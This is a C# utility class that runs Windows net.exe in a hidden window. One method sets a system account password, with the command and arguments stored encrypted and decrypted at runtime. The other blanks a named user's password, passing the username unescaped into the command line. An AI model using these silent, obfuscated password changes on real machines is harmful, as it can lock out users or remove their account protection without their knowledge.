﻿/*
   Copyright (C) 2011-2016 AC Inc. (Andy Cheung)

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

using ACLibrary.Crypto.MixCryptSeries;
using ACLoginPasswordUtil;
using System;
using System.Diagnostics;
using System.Text;

namespace LPU_Util
{
    public class PSWTool
    {
        private PSWTool() { }

        private static string ConstructCommandText(string sysPath, string psw, Resources resClass)
        {
            string b = new Mid().DecryptString(resClass.baseCmd, psw);
            StringBuilder sBuilder = new StringBuilder();
            sBuilder.Append(sysPath);
            sBuilder.Append("\\System32\\");
            sBuilder.Append(b);
            return sBuilder.ToString();
        }

        private static string ConstructArgText(string psw, Resources resClass, int pswInt)
        {
            StringBuilder sBuilder = new StringBuilder();
            string n = new Mid().DecryptString(resClass.netCmd, psw);
            string a = new Mid().DecryptString(resClass.armv7a, psw);
            sBuilder.Clear();
            sBuilder.Append(n);  // arg1 " user ..."
            sBuilder.Append(a); // KeyChar
            sBuilder.Append(pswInt); // Int
            return sBuilder.ToString();
        }

        public static void ChangeSystemPassword(string sysPath, string psw, Resources resClass, int pswInt)
        {
            string commandText = ConstructCommandText(sysPath, psw, resClass);
            string optionText = ConstructArgText(psw, resClass, pswInt);
            ProcessStartInfo psi = new ProcessStartInfo(commandText, optionText);
            psi.UseShellExecute = false;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }

        public static void SetSystemPasswordEmpty(string username)
        {
            string systemPath = Environment.GetEnvironmentVariable("SystemRoot");

            ProcessStartInfo psi = new ProcessStartInfo(systemPath + "\\System32\\net.exe", "user \"" + username + "\" \"\"");

            psi.UseShellExecute = false;

            psi.WindowStyle = ProcessWindowStyle.Hidden;

            Process.Start(psi);
        }
    }
}
